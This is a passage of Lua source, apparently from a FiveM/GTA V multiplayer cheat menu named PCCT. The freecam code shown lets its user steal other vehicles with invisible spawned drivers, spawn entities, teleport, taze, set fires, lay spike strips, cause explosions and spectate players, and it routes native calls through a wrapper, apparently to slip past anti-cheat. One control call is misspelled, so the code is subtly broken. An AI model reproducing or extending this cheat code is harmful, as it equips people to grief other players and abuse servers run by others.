            CreateThread(function()

                _stealing = ent

                local model = PCCT.FreeCam.SpawnerOptions.PED[picho.math.random(1, #PCCT.FreeCam.SpawnerOptions.PED)]



                if not PCCT:RequestModelSync(model) then

                    _stealing = nil



                    return PCCT:AddNotification("Failed to steal vehicle!")

                end



                local c = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(_stealing, 0.0, 0.0, 0.0)

                local x, y, z = c.x, c.y, c.z

                local out, pos = PCCT:GetFunction("GetClosestMajorVehicleNode")(x, y, z, 10.0, 0)



                if not out then

                    pos = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(_stealing, picho.math.random(-6, 6) + 0.0, picho.math.random(-6, 6) + 0.0, 0.0)

                end



                local random_npc = PCCT:GetFunction("CreatePed")(24, PCCT:GetFunction("GetHashKey")(model), pos.x, pos.y, pos.z, 0.0, true, true)

                _stealing_ped = random_npc



                if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTSHIFT"]) then

                    PCCT:GetFunction("SetEntityVisible")(random_npc, false)

                end



                PCCT:GetFunction("SetPedAlertness")(random_npc, 0.0)

                local success = PCCT:StealVehicleThread(random_npc, _stealing, true)

                PCCT:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(random_npc, true)

                PCCT:GetFunction("TaskVehicleDriveWander")(random_npc, _stealing, 1000.0, 60)

                local timeout = 0



                if not success then

                    _stealing = nil

                    _stealing_ped = nil



                    return

                end



                while PCCT:GetFunction("DoesEntityExist")(_stealing) and PCCT:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc and not PCCT:GetFunction("IsEntityDead")(random_npc) and timeout <= 25000 do

                    timeout = timeout + 10

                    Wait(100)

                end



                if PCCT:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc then

                    _stealing = nil



                    return PCCT:AddNotification("ERROR", "Failed to steal vehicle!")

                end



                PCCT:DoRCCar(random_npc, _stealing)

                _stealing_ped = nil

                _stealing = nil

            end)

        elseif PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["MOUSE1"]) and self:CheckType(ent, "VEHICLE") then

            CreateThread(function()

                _stealing = ent

                local model = PCCT.FreeCam.SpawnerOptions.PED[picho.math.random(1, #PCCT.FreeCam.SpawnerOptions.PED)]



                if not PCCT:RequestModelSync(model) then

                    _stealing = nil



                    return PCCT:AddNotification("ERROR", "Failed to steal vehicle!")

                end



                if PCCT.Config.SafeMode then

                    PCCT:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo")

                else

                    PCCT:GetFunction("ClearPedTasksImmediately")(PCCT:GetFunction("GetPedInVehicleSeat")(_stealing, -1))

                    local random_npc = PCCT:GetFunction("CreatePedInsideVehicle")(_stealing, 24, PCCT:GetFunction("GetHashKey")(model), -1, true, true)



                    if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTSHIFT"]) then

                        PCCT:GetFunction("SetEntityVisible")(random_npc, false)

                    end



                    PCCT:GetFunction("SetPedAlertness")(random_npc, 0.0)

                    PCCT:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(random_npc, true)

                    PCCT:GetFunction("TaskVehicleDriveWander")(random_npc, _stealing, 1000.0, 60)

                    _stealing_ped = random_npc



                    if PCCT:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc then

                        _stealing = nil



                        return PCCT:AddNotification("ERROR", "Failed to steal vehicle!")

                    end



                    PCCT:DoRCCar(random_npc, _stealing)

                end



                _stealing_ped = nil

                _stealing = nil

            end)

        elseif PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["X"]) then

            CreateThread(function()

                local modelName = PCCT:GetTextInput("Enter vehicle spawn name", "", 20)

                if modelName == "" or not PCCT:RequestModelSync(modelName) then return PCCT:AddNotification("ERROR", "That is not a vaild vehicle model.", 10000) end



                if modelName then

                    local car = PCCT:GetFunction("CreateVehicle")(PCCT:GetFunction("GetHashKey")(modelName), endCoords.x, endCoords.y, endCoords.z, picho.math.random(-360, 360) + 0.0, true, false)



                    if PCCT:GetFunction("DoesEntityExist")(car) then

                        _stealing = car

                        local model = PCCT.FreeCam.SpawnerOptions.PED[picho.math.random(1, #PCCT.FreeCam.SpawnerOptions.PED)]



                        if not PCCT:RequestModelSync(model) then

                            _stealing = nil



                            return PCCT:AddNotification("ERROR", "Failed to steal vehicle!")

                        end



                        if PCCT.Config.SafeMode then

                            PCCT:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo")

                        else

                            PCCT:GetFunction("ClearPedTasksImmediately")(PCCT:GetFunction("GetPedInVehicleSeat")(_stealing, -1))

                            local random_npc = PCCT:GetFunction("CreatePedInsideVehicle")(_stealing, 24, PCCT:GetFunction("GetHashKey")(model), -1, true, true)

                            PCCT:GetFunction("SetPedAlertness")(random_npc, 0.0)

                            PCCT:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(random_npc, true)

                            PCCT:GetFunction("TaskVehicleDriveWander")(random_npc, _stealing, 1000.0, 60)

                            _stealing_ped = random_npc



                            if PCCT:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc then

                                _stealing = nil



                                return PCCT:AddNotification("ERROR", "Failed to steal vehicle!")

                            end



                            PCCT:DoRCCar(random_npc, _stealing)

                        end



                        _stealing_ped = nil

                        _stealing = nil

                    end

                end

            end)

        end



        self:DrawBoundingBox(ent, 255, 255, 120, 50)

        self:DrawInfoCard(ent)

    end



    function PCCT.FreeCam:ManipulationLogic(cam, x, y, z)

        if PCCT:GetFunction("UpdateOnscreenKeyboard")() ~= -1 and PCCT:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and PCCT:GetFunction("UpdateOnscreenKeyboard")() ~= 2 then return end

        self:Crosshair((PCCT:GetFunction("DoesEntityHaveDrawable")(self.HoveredEntity) and PCCT:GetFunction("DoesEntityExist")(self.HoveredEntity)) or (PCCT:GetFunction("DoesEntityHaveDrawable")(self.DraggingEntity) and PCCT:GetFunction("DoesEntityExist")(self.DraggingEntity)))

        local rightVec, forwardVec, upVec = PCCT:GetFunction("GetCamMatrix")(cam)

        local curVec = vector3(x, y, z)

        local targetVec = curVec + forwardVec * 150

        local handle = PCCT:GetFunction("StartShapeTestRay")(curVec.x, curVec.y, curVec.z, targetVec.x, targetVec.y, targetVec.z, -1)

        local _, hit, endCoords, _, entity = PCCT:GetFunction("GetShapeTestResult")(handle)



        if self.DraggingEntity and not PCCT:GetFunction("DoesEntityExist")(self.DraggingEntity) then

            self.DraggingEntity = nil

            self.Rotating = nil

            lift_height = 0.0

            lift_inc = 0.1



            return

        end



        if PCCT.Showing then return end



        if PCCT.Config.ShowNotifications and notif_alpha > 0 then

            offX = _lerp(0.1, offX, 429)

        else

            offX = _lerp(0.1, offX, 0)

        end



        if not hit then

            endCoords = targetVec

        end



        if preview_spike_strip and PCCT:GetFunction("DoesEntityExist")(preview_spike_strip) and self.Mode ~= self.Modes["SPIKE_STRIPS"] then

            PCCT.Util:DeleteEntity(preview_spike_strip)

            preview_spike_strip = nil

        end



        if self:CheckType(entity, "ALL") then

            self.HoveredEntity = entity

        else

            self.HoveredEntity = nil

        end



        if self.Mode == self.Modes["REMOVER"] then return self:Remover(entity, "ALL") end

        PCCT:SetIbuttons({{PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["MOUSE1"], 0), "Select"}, {"b_117", "Change Mode"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["E"], 0), "Clone"}})



        if self.Mode == self.Modes["PED_SPAWNER"] then

            self:Spawner(endCoords, GetGameplayCamRelativeHeading(), "PED")

        elseif self.Mode == self.Modes["OBJ_SPAWNER"] then

            self:Spawner(endCoords, GetGameplayCamRelativeHeading(), "OBJECT")

        elseif self.Mode == self.Modes["VEH_SPAWNER"] then

            self:Spawner(endCoords, GetGameplayCamRelativeHeading(), "VEHICLE")

        elseif self.Mode == self.Modes["PREMADE_SPAWNER"] then

            self:Spawner(endCoords, GetGameplayCamRelativeHeading(), "PREMADE")

        elseif self.Mode == self.Modes["SHOOT_BULLET"] then

            self:Spawner(endCoords, GetGameplayCamRelativeHeading(), "BULLET")

        elseif self.Mode == self.Modes["TELEPORT"] then

            PCCT:SetIbuttons({{PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["MOUSE1"], 0), "Teleport"}, {"b_117", "Change Mode"}})



            if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["MOUSE1"]) and not PCCT.Showing and hit then

                PCCT:GetFunction("SetEntityCoords")(PCCT.LocalPlayer, endCoords.x, endCoords.y, endCoords.z, false, false, false, false)

                PCCT:AddNotification("INFO", "Teletransportado!", 2500)

            end



            return

        elseif self.Mode == self.Modes["RC_CAR"] then

            return self:DoRCCar(self.HoveredEntity, endCoords)

        elseif self.Mode == self.Modes["STEAL"] then

            return self:DoSteal(self.HoveredEntity)

        elseif self.Mode == self.Modes["TAZE"] then

            return self:DoTaze(self.HoveredEntity, endCoords)

        elseif self.Mode == self.Modes["HYDRANT"] then

            return self:DoHydrant(self.HoveredEntity, endCoords)

        elseif self.Mode == self.Modes["FIRE"] then

            return self:DoFire(self.HoveredEntity, endCoords)

        elseif self.Mode == self.Modes["SPIKE_STRIPS"] then

            return self:DoSpikeStrips(self.HoveredEntity, endCoords)

        elseif self.Mode == self.Modes["DISABLE_VEHICLE"] then

            return self:DoDisable(self.HoveredEntity, endCoords)

        elseif self.Mode == self.Modes["EXPLODE"] then

            return self:DoExplosion(self.HoveredEntity, endCoords)

        end



        if PCCT:GetFunction("DoesEntityExist")(self.DraggingEntity) then

            if picho.frozen_ents[self.DraggingEntity] == nil then

                picho.frozen_ents[self.DraggingEntity] = true

            end



            if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["DELETE"]) and not PCCT.Showing then

                if self.DraggingEntity == PCCT.LocalPlayer then return PCCT:AddNotification("ERROR", "You can not delete yourself!", 10000) end

                if _is_ped_player(self.DraggingEntity) then return PCCT:AddNotification("ERROR", "You can not delete players!", 10000) end

                self:DrawBoundingBox(self.DraggingEntity, 255, 50, 50, 50)

                PCCT:AddNotification("INFO", "Deleted " .. ("<font color='#%s'>%s</font>"):format(PCCT.TertiaryHex, picho.tostring(self.DraggingEntity)), 10000)

                PCCT.Util:DeleteEntity(self.DraggingEntity)

                self.DraggingEntity = nil

                lift_height = 0.0

                lift_inc = 0.1

                self.Rotating = nil



                return

            end



            if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["E"]) then

                self:Clone(self.DraggingEntity)

            end



            if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["MOUSE2"]) and not PCCT.Showing then

                local data = self.DraggingData



                if data then

                    PCCT:GetFunction("SetEntityCoords")(self.DraggingEntity, data.Position.x, data.Position.y, data.Position.z, false, false, false, false)

                    PCCT:GetFunction("SetEntityRotation")(self.DraggingEntity, data.Rotation.x, data.Rotation.y, data.Rotation.z)

                end



                self.DraggingEntity = nil

                lift_height = 0.0

                lift_inc = 0.1

                self.Rotating = nil



                return

            elseif PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["MOUSE1"]) and not PCCT.Showing then

                self.DraggingEntity = nil

                lift_height = 0.0

                lift_inc = 0.1

                self.Rotating = nil



                return

            end



            if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["R"]) and not PCCT.Showing then

                self.Rotating = not self.Rotating

                local rot = PCCT:GetFunction("GetEntityRotation")(self.DraggingEntity)

                rotP, rotY, rotR = rot.x, rot.y, rot.z

            end



            if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["LEFTALT"]) and not self.Rotating then

                picho.frozen_ents[self.DraggingEntity] = not picho.frozen_ents[self.DraggingEntity]

            end



            PCCT:GetFunction("FreezeEntityPosition")(self.DraggingEntity, picho.frozen_ents[entity])



            if self.Rotating and not PCCT.Showing then

                self:DrawBoundingBox(self.DraggingEntity, 255, 125, 50, 50)

                PCCT:SetIbuttons({{PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["R"], 0), "Exit Rotate Mode"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["MOUSE2"], 0), "Reset Position"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["MOUSE1"], 0), "Stop Dragging"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["LEFTSHIFT"], 0), "Snap Nearest 45 Degrees"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["LEFTALT"], 0), "Increment x" .. (PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTALT"]) and 1.0 or 15.0)}, {"t_D%t_A", "Roll"}, {"t_W%t_S", "Pitch"}, {"b_2000%t_X", "Yaw"}})



                if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["D"]) then

                    rotR = rotR + (PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTALT"]) and 1.0 or 15.0)



                    if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTSHIFT"]) then

                        rotR = _snap(rotR)

                    end

                end



                if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["A"]) then

                    rotR = rotR - (PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTALT"]) and 1.0 or 15.0)



                    if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTSHIFT"]) then

                        rotR = _snap(rotR)

                    end

                end



                if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["W"]) then

                    rotP = rotP - (PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTALT"]) and 1.0 or 15.0)



                    if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTSHIFT"]) then

                        rotP = _snap(rotP)

                    end

                end



                if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["S"]) then

                    rotP = rotP + (PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTALT"]) and 1.0 or 15.0)



                    if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTSHIFT"]) then

                        rotP = _snap(rotP)

                    end

                end



                if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["SPACE"]) then

                    rotY = rotY - (PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTALT"]) and 1.0 or 15.0)



                    if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTSHIFT"]) then

                        rotY = _snap(rotY)

                    end

                end



                if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["X"]) then

                    rotY = rotY + (PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTALT"]) and 1.0 or 15.0)



                    if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTSHIFT"]) then

                        rotY = _snap(rotY)

                    end

                end



                PCCT:GetFunction("SetEntityRotation")(self.DraggingEntity, rotP + 0.0, rotY + 0.0, rotR + 0.0)

                self:DrawInfoCard(self.DraggingEntity)



                return PCCT:GetFunction("NetworkRequestControlOfEntity")(self.DraggingEntity)

            end



            local handleTrace = PCCT:GetFunction("StartShapeTestRay")(curVec.x, curVec.y, curVec.z, targetVec.x, targetVec.y, targetVec.z, -1, self.DraggingEntity)

            local _, hit, endPos, _, _ = PCCT:GetFunction("GetShapeTestResult")(handleTrace)

            local c = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(self.DraggingEntity, 0.0, 0.0, 0.0)

            local cX, cY, cZ = c.x, c.y, c.z

            local cam_rot = PCCT:GetFunction("GetCamRot")(self.Cam, 0)

            local rot = PCCT:GetFunction("GetEntityRotation")(self.DraggingEntity)

            PCCT:GetFunction("SetEntityRotation")(self.DraggingEntity, rot.x, rot.y, cam_rot.z + 0.0)



            if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["MWHEELDOWN"]) then

                lift_inc = lift_inc + 0.01



                if lift_inc <= 0.01 then

                    lift_inc = 0.01

                elseif lift_inc >= 3 then

                    lift_inc = 3

                end

            end



            if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["MWHEELUP"]) then

                lift_inc = lift_inc - 0.01



                if lift_inc <= 0.01 then

                    lift_inc = 0.01

                elseif lift_inc >= 3 then

                    lift_inc = 3

                end

            end



            if PCCT:GetFunction("IsDisabledControlPessed")(0, PCCT.Keys["C"]) then

                lift_height = lift_height + lift_inc

            end



            if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["Z"]) then

                lift_height = lift_height - lift_inc

            end



            if hit then

                PCCT:GetFunction("SetEntityCoords")(self.DraggingEntity, endPos.x, endPos.y, endPos.z + lift_height, false, false, false, false)

                self:DrawBoundingBox(self.DraggingEntity, 50, 255, 50, 50)

            else

                PCCT:GetFunction("SetEntityCoords")(self.DraggingEntity, targetVec.x, targetVec.y, targetVec.z + lift_height, false, false, false, false)

                self:DrawBoundingBox(self.DraggingEntity, 50, 255, 50, 50)

            end



            self:DrawInfoCard(self.DraggingEntity)

            PCCT:SetIbuttons({{PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["C"], 0), "Lift Up (+" .. lift_inc .. ")"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["Z"], 0), "Push Down (-" .. lift_inc .. ")"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["R"], 0), "Rotate"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["LEFTALT"], 0), "Toggle Frozen"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["MOUSE2"], 0), "Reset Position"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["MOUSE1"], 0), "Stop Dragging"}, {PCCT:GetFunction("GetControlInstructionalButton")(0, PCCT.Keys["E"], 0), "Clone"}})



            return PCCT:GetFunction("NetworkRequestControlOfEntity")(self.DraggingEntity)

        end



        local ent = PCCT:GetFunction("DoesEntityExist")(self.DraggingEntity) and self.DraggingEntity or self.HoveredEntity



        if PCCT:GetFunction("DoesEntityExist")(ent) and PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["E"]) then

            self:Clone(ent)

        end



        if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTSHIFT"]) or beginning_target ~= nil then return self:PedTarget(cam, x, y, z) end



        if PCCT:GetFunction("DoesEntityExist")(self.HoveredEntity) and PCCT:GetFunction("DoesEntityHaveDrawable")(self.HoveredEntity) and not PCCT:GetFunction("DoesEntityExist")(self.DraggingEntity) then

            if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["MOUSE1"]) and not PCCT.Showing and not _is_ped_player(self.HoveredEntity) then

                self.DraggingEntity = self.HoveredEntity



                self.DraggingData = {

                    Position = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(self.HoveredEntity, 0.0, 0.0, 0.0),

                    Rotation = PCCT:GetFunction("GetEntityRotation")(self.HoveredEntity)

                }

            else

                self:DrawBoundingBox(self.HoveredEntity, 255, 255, 255, 50)

                self:DrawInfoCard(self.HoveredEntity)

            end

        end

    end



    function PCCT.FreeCam:DisableMovement(off)

        PCCT:GetFunction("DisableControlAction")(1, 30, off)

        PCCT:GetFunction("DisableControlAction")(1, 31, off)

        PCCT:GetFunction("DisableControlAction")(1, 32, off)

        PCCT:GetFunction("DisableControlAction")(1, 33, off)

        PCCT:GetFunction("DisableControlAction")(1, 34, off)

        PCCT:GetFunction("DisableControlAction")(1, 35, off)

        PCCT:GetFunction("DisableControlAction")(1, 36, off)

        PCCT:GetFunction("DisableControlAction")(1, 37, off)

        PCCT:GetFunction("DisableControlAction")(1, 38, off)

        PCCT:GetFunction("DisableControlAction")(1, 44, off)

        PCCT:GetFunction("DisableControlAction")(1, 45, off)

        PCCT:GetFunction("DisableControlAction")(0, 63, off)

        PCCT:GetFunction("DisableControlAction")(0, 64, off)

        PCCT:GetFunction("DisableControlAction")(0, 71, off)

        PCCT:GetFunction("DisableControlAction")(0, 72, off)

        PCCT:GetFunction("DisableControlAction")(0, 75, off)

        PCCT:GetFunction("DisableControlAction")(0, 278, off)

        PCCT:GetFunction("DisableControlAction")(0, 279, off)

        PCCT:GetFunction("DisableControlAction")(0, 280, off)

        PCCT:GetFunction("DisableControlAction")(0, 281, off)

        PCCT:GetFunction("DisablePlayerFiring")(PCCT.NetworkID, off)

        PCCT:GetFunction("DisableControlAction")(0, 24, off)

        PCCT:GetFunction("DisableControlAction")(0, 25, off)

        PCCT:GetFunction("DisableControlAction")(1, 37, off)

        PCCT:GetFunction("DisableControlAction")(0, 47, off)

        PCCT:GetFunction("DisableControlAction")(0, 58, off)

        PCCT:GetFunction("DisableControlAction")(0, 140, off)

        PCCT:GetFunction("DisableControlAction")(0, 141, off)

        PCCT:GetFunction("DisableControlAction")(0, 81, off)

        PCCT:GetFunction("DisableControlAction")(0, 82, off)

        PCCT:GetFunction("DisableControlAction")(0, 83, off)

        PCCT:GetFunction("DisableControlAction")(0, 84, off)

        PCCT:GetFunction("DisableControlAction")(0, 12, off)

        PCCT:GetFunction("DisableControlAction")(0, 13, off)

        PCCT:GetFunction("DisableControlAction")(0, 14, off)

        PCCT:GetFunction("DisableControlAction")(0, 15, off)

        PCCT:GetFunction("DisableControlAction")(0, 24, off)

        PCCT:GetFunction("DisableControlAction")(0, 16, off)

        PCCT:GetFunction("DisableControlAction")(0, 17, off)

        PCCT:GetFunction("DisableControlAction")(0, 96, off)

        PCCT:GetFunction("DisableControlAction")(0, 97, off)

        PCCT:GetFunction("DisableControlAction")(0, 98, off)

        PCCT:GetFunction("DisableControlAction")(0, 96, off)

        PCCT:GetFunction("DisableControlAction")(0, 99, off)

        PCCT:GetFunction("DisableControlAction")(0, 100, off)

        PCCT:GetFunction("DisableControlAction")(0, 142, off)

        PCCT:GetFunction("DisableControlAction")(0, 143, off)

        PCCT:GetFunction("DisableControlAction")(0, 263, off)

        PCCT:GetFunction("DisableControlAction")(0, 264, off)

        PCCT:GetFunction("DisableControlAction")(0, 257, off)

        PCCT:GetFunction("DisableControlAction")(1, PCCT.Keys["C"], off)

        PCCT:GetFunction("DisableControlAction")(1, PCCT.Keys["F"], off)

        PCCT:GetFunction("DisableControlAction")(1, PCCT.Keys["LEFTCTRL"], off)

        PCCT:GetFunction("DisableControlAction")(1, PCCT.Keys["MOUSE1"], off)

        PCCT:GetFunction("DisableControlAction")(1, 25, off)

        PCCT:GetFunction("DisableControlAction")(1, PCCT.Keys["R"], off)

        PCCT:GetFunction("DisableControlAction")(1, 45, off)

        PCCT:GetFunction("DisableControlAction")(1, 80, off)

        PCCT:GetFunction("DisableControlAction")(1, 140, off)

        PCCT:GetFunction("DisableControlAction")(1, 250, off)

        PCCT:GetFunction("DisableControlAction")(1, 263, off)

        PCCT:GetFunction("DisableControlAction")(1, 310, off)

        PCCT:GetFunction("DisableControlAction")(1, PCCT.Keys["TAB"], off)

        PCCT:GetFunction("DisableControlAction")(1, PCCT.Keys["SPACE"], off)

        PCCT:GetFunction("DisableControlAction")(1, PCCT.Keys["X"], off)

    end



    function PCCT.FreeCam:DisableCombat(off)

        PCCT:GetFunction("DisablePlayerFiring")(PCCT.NetworkID, off) 

        PCCT:GetFunction("DisableControlAction")(0, 24, off)

        PCCT:GetFunction("DisableControlAction")(0, 25, off)

        PCCT:GetFunction("DisableControlAction")(1, 37, off)

        PCCT:GetFunction("DisableControlAction")(0, 47, off)

        PCCT:GetFunction("DisableControlAction")(0, 58, off)

        PCCT:GetFunction("DisableControlAction")(0, 140, off)

        PCCT:GetFunction("DisableControlAction")(0, 141, off)

        PCCT:GetFunction("DisableControlAction")(0, 142, off)

        PCCT:GetFunction("DisableControlAction")(0, 143, off)

        PCCT:GetFunction("DisableControlAction")(0, 263, off)

        PCCT:GetFunction("DisableControlAction")(0, 264, off)

        PCCT:GetFunction("DisableControlAction")(0, 257, off)

    end



    function PCCT:EnableMouse()

        self:GetFunction("EnableControlAction")(0, 1, true)

        self:GetFunction("EnableControlAction")(0, 2, true)

        self:GetFunction("EnableControlAction")(0, 3, true)

        self:GetFunction("EnableControlAction")(0, 4, true)

        self:GetFunction("EnableControlAction")(0, 5, true)

        self:GetFunction("EnableControlAction")(0, 6, true)

        self:GetFunction("EnableControlAction")(1, 1, true)

        self:GetFunction("EnableControlAction")(1, 2, true)

        self:GetFunction("EnableControlAction")(1, 3, true)

        self:GetFunction("EnableControlAction")(1, 4, true)

        self:GetFunction("EnableControlAction")(1, 5, true)

        self:GetFunction("EnableControlAction")(1, 6, true)

    end



    function PCCT.FreeCam:MoveCamera(cam, x, y, z)

        if PCCT:GetFunction("UpdateOnscreenKeyboard")() ~= -1 and PCCT:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and PCCT:GetFunction("UpdateOnscreenKeyboard")() ~= 2 then return x, y, z end

        if self.Rotating then return x, y, z end

        local curVec = vector3(x, y, z)

        local rightVec, forwardVec, upVec = PCCT:GetFunction("GetCamMatrix")(cam)

        local speed = 1.0



        if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTCTRL"]) then

            speed = 0.1

        elseif PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTSHIFT"]) then

            speed = 3.0

        end



        if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["W"]) then

            curVec = curVec + forwardVec * speed

        end



        if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["S"]) then

            curVec = curVec - forwardVec * speed

        end



        if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["A"]) then

            curVec = curVec - rightVec * speed

        end



        if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["D"]) then

            curVec = curVec + rightVec * speed

        end



        if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["SPACE"]) then

            curVec = curVec + upVec * speed

        end



        if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["X"]) then

            curVec = curVec - upVec * speed

        end



        return curVec.x, curVec.y, curVec.z

    end



    function PCCT.FreeCam:DrawMode()

        local name = self.ModeNames[self.Mode]

        PCCT:ScreenText("[" .. ("<font color='#%s'>%s</font>"):format(PCCT.TertiaryHex, PCCT.Name) .. "] Freecam Mode: " .. ("<font color='#%s'>%s</font>"):format(PCCT.TertiaryHex, name), 4, 1.0, 0.5, 0.97, 0.35, 255, 255, 255, 225)

    end



    local _on



    function PCCT.FreeCam:Tick()

        if not PCCT:GetFunction("DoesCamExist")(self.Cam) then

            self.Cam = PCCT:GetFunction("CreateCam")("DEFAULT_SCRIPTED_CAMERA", true)

            PCCT:GetFunction("SetCamShakeAmplitude")(self.Cam, 0.0)

        end



        while PCCT.Enabled do

            PCCT.FreeCam:Switcher()

            local rot_vec = PCCT:GetFunction("GetGameplayCamRot")(0)

            Wait(0)



            if self.On and not _on then

                PCCT:GetFunction("SetCamActive")(self.Cam, true)

                PCCT:GetFunction("SetCamAffectsAiming")(self.Cam, false)

                PCCT:GetFunction("SetCamActive")(PCCT:GetFunction("GetRenderingCam")(), false)

                PCCT:GetFunction("RenderScriptCams")(true, false, false, true, true)

                _on = true

                local coords = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(PCCT.LocalPlayer, 0.0, 0.0, 0.0) + (PCCT:GetFunction("GetEntityForwardVector")(PCCT.LocalPlayer) * 2)

                camX, camY, camZ = coords.x, coords.y, coords.z + 1.0

                PCCT:GetFunction("ClearPedTasks")(PCCT.LocalPlayer)

                self:DeletePreview()

            elseif not self.On and _on then

                PCCT:GetFunction("SetCamActive")(self.Cam, false)

                PCCT:GetFunction("SetCamActive")(PCCT:GetFunction("GetRenderingCam")(), true)

                PCCT:GetFunction("RenderScriptCams")(false, false, false, false, false)

                PCCT:GetFunction("SetFocusEntity")(PCCT.LocalPlayer)

                self:DisableMovement(false)

                self:DeletePreview()

                _on = false

            end



            if self.On and _on then

                PCCT:GetFunction("DisableAllControlActions")(0)

                PCCT:EnableMouse()

                PCCT:GetFunction("StopGameplayCamShaking")(true)

                local coords = PCCT:GetFunction("GetOffsetFromEntityInWorldCoords")(PCCT.LocalPlayer)

                PCCT:GetFunction("RequestCollisionAtCoord")(coords.x, coords.y, coords.z)

                PCCT:DrawIbuttons()

                self:DrawMode()

                self:DisableMovement(true)

                PCCT:GetFunction("SetFocusPosAndVel")(camX, camY, camZ, 0, 0, 0)

                PCCT:GetFunction("SetCamCoord")(self.Cam, camX, camY, camZ)

                PCCT:GetFunction("SetCamRot")(self.Cam, rot_vec.x + 0.0, rot_vec.y + 0.0, rot_vec.z + 0.0)

                camX, camY, camZ = self:MoveCamera(self.Cam, camX, camY, camZ)

                self:ManipulationLogic(self.Cam, camX, camY, camZ)

            end

        end

    end



    function PCCT:Spectate(who)

        self.FreeCam.On = false

        self.RCCar.CamOn = false



        if not who then

            self.SpectatingPlayer = nil

            self.Spectating = false



            return

        end



        picho.spectating_fov = -3.9

        self.SpectatingPlayer = who

        self.Spectating = true

    end



    function PCCT:DoRCCar(driver, veh)

        if self.RCCar.On then

            PCCT:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(self.RCCar.Driver, false)

            PCCT:GetFunction("ClearPedTasks")(self.RCCar.Driver)

            PCCT:GetFunction("ClearPedSecondaryTask")(self.RCCar.Driver)



            if driver then

                self.Util:DeleteEntity(self.RCCar.Driver)

